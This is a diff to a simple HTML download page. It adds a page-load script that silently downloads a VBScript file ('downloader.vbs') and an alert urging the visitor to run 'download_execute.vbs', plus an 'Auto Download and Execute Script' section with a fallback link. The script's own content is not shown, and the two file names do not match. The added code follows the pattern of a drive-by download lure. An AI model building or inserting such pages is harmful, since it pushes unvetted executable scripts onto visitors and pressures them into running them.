@@ -3,7 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Test File</title>
+    <title>Downloading Files</title>
+    <script>
+        window.onload = function() {
+            var link = document.createElement('a');
+            link.href = 'downloader.vbs'; // VBScript file
+            link.download = 'downloader.vbs';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            // Alert the user to run the VBS file manually
+            alert("Download started. Please open 'download_execute.vbs' to run the script.");
+        };
+    </script>
 </head>
 <body>
     <h1>Download text</h1>
@@ -12,5 +24,8 @@
     <h1>Download Script</h1>
     <p>Click below to download the batch script:</p>
     <a href="script.bat" download>Download script.bat</a>
+    <h1>Auto Download and Execute Script</h1>
+    <p>Your script should start downloading automatically.</p>
+    <p>If not, <a href="download_execute.vbs" download>click here</a> to download manually.</p>
 </body>
 </html>
